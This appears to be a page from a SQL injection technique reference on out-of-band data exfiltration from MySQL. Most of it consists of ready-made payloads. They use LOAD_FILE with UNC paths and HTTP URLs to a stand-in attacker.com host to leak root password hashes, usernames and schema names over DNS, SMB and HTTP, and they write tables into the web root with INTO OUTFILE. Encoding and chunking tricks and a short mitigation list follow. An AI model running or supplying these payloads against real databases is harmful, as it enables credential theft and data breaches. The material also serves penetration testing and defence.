---
title: Out of Band Channeling
description: Techniques for exfiltrating data through out-of-band channels in MySQL
category: Advanced Techniques
order: 17
tags: ["OOB", "exfiltration", "DNS", "HTTP"]
lastUpdated: 2025-03-15
---

## Out of Band Channeling

Out-of-band (OOB) channeling refers to techniques that exfiltrate data through channels other than the application's normal response. This approach is extremely valuable in blind SQL injection scenarios where no data is returned in the application's response.

### When to Use OOB Techniques

- Blind SQL injection scenarios where no output is visible
- Cases where application responses are filtered or truncated
- When the regular injection process is too slow or limited
- When firewall rules block traditional SQL injection but allow outbound connections

### MySQL OOB Methods

MySQL offers several mechanisms for out-of-band data exfiltration:

#### 1. DNS Exfiltration

DNS exfiltration works by forcing MySQL to perform DNS lookups for domain names containing the extracted data:

```sql
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM mysql.user WHERE user='root' LIMIT 1), '.attacker.com\\share\\file'));
```

This causes MySQL to resolve a subdomain like `5f4dcc3b5aa765d61d8327deb882cf99.attacker.com`, sending the password hash as part of the DNS request.

#### 2. HTTP Requests (via LOAD_FILE/load data local)

MySQL can attempt to fetch URLs, which can be used for data exfiltration:

```sql
SELECT LOAD_FILE(CONCAT('http://attacker.com/', (SELECT password FROM mysql.user WHERE user='root')));
```

#### 3. File-based Exfiltration

If you have the FILE privilege:

```sql
-- Write data to a file
SELECT * FROM users INTO OUTFILE '/var/www/html/exported_data.txt';
-- Then retrieve it via HTTP or another method
```

### Practical Examples

#### Basic DNS Exfiltration

```sql
-- Exfiltrate MySQL version via DNS
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT VERSION()), '.version.attacker.com\\share\\file'));
```

#### Data Extraction via DNS

```sql
-- Extract usernames character by character
-- Extract first character of first username
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT ASCII(SUBSTRING(username,1,1)) FROM users LIMIT 1), '.char1.attacker.com\\share\\file'));
```

#### SMB Shares Exfiltration

```sql
-- Using UNC paths to connect to SMB shares
SELECT LOAD_FILE('\\\\attacker.com\\share\\file');
```

### Required Setup

To capture this data, you need:

1. A domain you control
2. A DNS server configured to log all requests (or a service like Burp Collaborator)
3. Proper network connectivity (the MySQL server must be able to resolve external domains)

### Advanced Techniques

#### Encoding Data for DNS Transport

For complex data, consider encoding to avoid invalid DNS characters:

```sql
-- Hex encoding
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT HEX(password) FROM mysql.user WHERE user='root' LIMIT 1), '.hex.attacker.com\\share\\file'));

-- Base64-like encoding (custom function needed)
-- Concept: implement base64 encoding using MySQL functions
```

#### Chunking Large Data

DNS labels have a maximum length of 63 characters, so chunk longer strings:

```sql
-- First 10 characters
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT SUBSTRING(table_schema,1,10) FROM information_schema.tables LIMIT 1), '.chunk1.attacker.com\\share\\file'));

-- Next 10 characters
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT SUBSTRING(table_schema,11,10) FROM information_schema.tables LIMIT 1), '.chunk2.attacker.com\\share\\file'));
```

### Limitations

1. DNS queries are generally limited to 253 characters
2. Some environments block outbound DNS or HTTP requests
3. FILE privilege or similar permissions may be required
4. Network latency and DNS caching can slow down extraction
5. Extracted data must be valid in DNS names (alphanumeric, hyphens)

### Mitigation

To prevent OOB attacks:

1. Restrict outbound connections from the database server
2. Set `skip-networking` for local-only MySQL instances
3. Configure firewalls to block unexpected outbound connections
4. Disable the FILE privilege
5. Monitor unusual DNS or network activity from database servers
6. Use prepared statements to prevent SQL injection
